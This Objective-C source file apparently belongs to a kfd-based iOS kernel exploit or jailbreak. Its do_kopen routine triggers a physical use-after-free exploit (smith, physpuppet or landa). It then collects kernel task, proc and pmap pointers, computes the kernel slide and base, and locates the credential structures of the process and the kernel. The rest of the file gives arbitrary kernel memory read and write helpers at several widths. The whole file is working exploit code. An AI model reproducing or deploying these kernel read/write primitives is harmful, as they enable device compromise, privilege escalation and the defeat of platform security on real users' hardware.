#import <Foundation/Foundation.h>
#import "krw.h"
#import "../exploit/libkfd.h"
#import "offsets.h"
bool exploit_puaf_smith;
bool exploit_physpuppet;
bool exploit_landa;
uint64_t _kfd = 0;
uint64_t _self_task = 0;
uint64_t _self_proc = 0;
uint64_t _self_pmap = 0;
uint64_t _self_map = 0;
uint64_t _kslide = 0;
uint64_t _kern_task = 0;
uint64_t _kern_proc = 0;
uint64_t _kern_pmap = 0;
uint64_t _kern_map = 0;
uint64_t kernel_base = 0;
uint64_t kern_pmap_min = 0;
uint64_t kern_pmap_max = 0;
uint64_t our_ucred = 0;
uint64_t kern_ucred = 0;
#define KERNEL_BASE_ADDRESS     0xFFFFFFF007004000
uint64_t get_selftask(void) {
    return _self_task;
}

uint64_t get_selfproc(void) {
    return _self_proc;
}

uint64_t get_selfpmap(void) {
    return _self_pmap;
}

uint64_t get_selfmap(void) {
    return _self_map;
}

uint64_t get_kslide(void) {
    return _kslide;
}

uint64_t get_kernproc(void) {
    return _kern_proc;
}

uint64_t get_kernmap(void) {
    return _kern_map;
}

uint64_t get_kernpmap(void) {
    return _kern_pmap;
}

uint64_t get_kerntask(void) {
    return _kern_task;
}

void set_selftask(void) {
    _self_task = ((struct kfd*)_kfd)->info.kernel.current_task;
}

void set_selfproc(void) {
    _self_proc = ((struct kfd*)_kfd)->info.kernel.current_proc;
}

void set_selfpmap(void) {
    _self_pmap = ((struct kfd*)_kfd)->info.kernel.current_pmap;
}

void set_selfmap(void) {
    _self_map = ((struct kfd*)_kfd)->info.kernel.current_map;
}

void set_kslide(void) {
    _kslide = ((struct kfd*)_kfd)->info.kernel.kernel_slide;
}

void set_kernproc(void) {
    _kern_proc = ((struct kfd*)_kfd)->info.kernel.kernel_proc;
}

void set_kernpmap(void) {
    _kern_pmap = ((struct kfd*)_kfd)->info.kernel.kernel_pmap;
}

void set_kernmap(void) {
    _kern_map = ((struct kfd*)_kfd)->info.kernel.kernel_map;
}

void set_kerntask(void) {
    _kern_task = ((struct kfd*)_kfd)->info.kernel.kernel_task;
}
uint64_t do_kopen(uint64_t puaf_method){
    uint64_t exploit_type = (1 << puaf_method);
    _offsets_init();
    _kfd = kopen(puaf_method);
    set_selftask();
    set_selfproc();
    set_selfpmap();
    set_selfmap();
    set_kerntask();
    set_kernproc();
    set_kernpmap();
    set_kernmap();
    set_kslide();
    kernel_base = get_kslide() + KERNEL_BASE_ADDRESS;
    kern_pmap_min = kread64_kfd(get_kernpmap() + 0x10);
    kern_pmap_max = kread64_kfd(get_kernpmap() + 0x18);
    our_ucred = kread64_kfd(kread64_kfd(get_selfproc() + 0x20) + 0x20);
    kern_ucred = kread64_kfd(kread64_kfd(get_kernproc() + 0x20) + 0x20);
    return _kfd;
}

void do_kclose(void)
{
    kclose(_kfd);
}
void do_kread(uint64_t kaddr, void* uaddr, uint64_t size)
{
    kread_kfd(_kfd, kaddr, uaddr, size);
}
void kreadbuf_kfd(uint64_t va, void* ua, size_t size) {
    uint64_t *v32 = (uint64_t*) ua;
    
    while (size) {
        size_t bytesToRead = (size > 8) ? 8 : size;
        uint64_t value = kread64_kfd(va);
        va += 8;
        
        if (bytesToRead == 8) {
            *v32++ = value;
        } else {
            memcpy(ua, &value, bytesToRead);
        }
        
        size -= bytesToRead;
    }
}
void kwritebuf_kfd(uint64_t va, const void* ua, size_t size) {
    uint8_t *v8 = (uint8_t*) ua;
    
    while (size >= 8) {
        kwrite64_kfd(va, *(uint64_t*)v8);
        size -= 8;
        v8 += 8;
        va += 8;
    }
    
    if (size) {
        uint64_t val = kread64_kfd(va);
        memcpy(&val, v8, size);
        kwrite64_kfd(va, val);
    }
}

uint64_t kread64_kfd(uint64_t va) {
    uint64_t u;
    kread_kfd(_kfd, va, &u, 8);
    return u;
}

uint32_t kread32_kfd(uint64_t va) {
    union {
        uint32_t u32[2];
        uint64_t u64;
    } u;
    u.u64 = kread64_kfd(va);
    return u.u32[0];
}

uint16_t kread16_kfd(uint64_t va) {
    union {
        uint16_t u16[4];
        uint64_t u64;
    } u;
    u.u64 = kread64_kfd(va);
    return u.u16[0];
}

uint8_t kread8_kfd(uint64_t va) {
    union {
        uint8_t u8[8];
        uint64_t u64;
    } u;
    u.u64 = kread64_kfd(va);
    return u.u8[0];
}

void kwrite64_kfd(uint64_t va, uint64_t val) {
    uint64_t u[1] = {};
    u[0] = val;
    kwrite_kfd((uint64_t)(_kfd), &u, va, 8);
}

void kwrite32_kfd(uint64_t va, uint32_t val) {
    union {
        uint32_t u32[2];
        uint64_t u64;
    } u;
    u.u64 = kread64_kfd(va);
    u.u32[0] = val;
    kwrite64_kfd(va, u.u64);
}

void kwrite16_kfd(uint64_t va, uint16_t val) {
    union {
        uint16_t u16[4];
        uint64_t u64;
    } u;
    u.u64 = kread64_kfd(va);
    u.u16[0] = val;
    kwrite64_kfd(va, u.u64);
}

void kwrite8_kfd(uint64_t va, uint8_t val) {
    union {
        uint8_t u8[8];
        uint64_t u64;
    } u;
    u.u64 = kread64_kfd(va);
    u.u8[0] = val;
    kwrite64_kfd(va, u.u64);
}


uint64_t kernel_pointer_decode(uint64_t ptr) {
    if (((struct kfd*)_kfd)->info.env.vid > 1) return ptr;
    ptr |= ~((1ULL << 47) - 1U);
    return ptr;
}
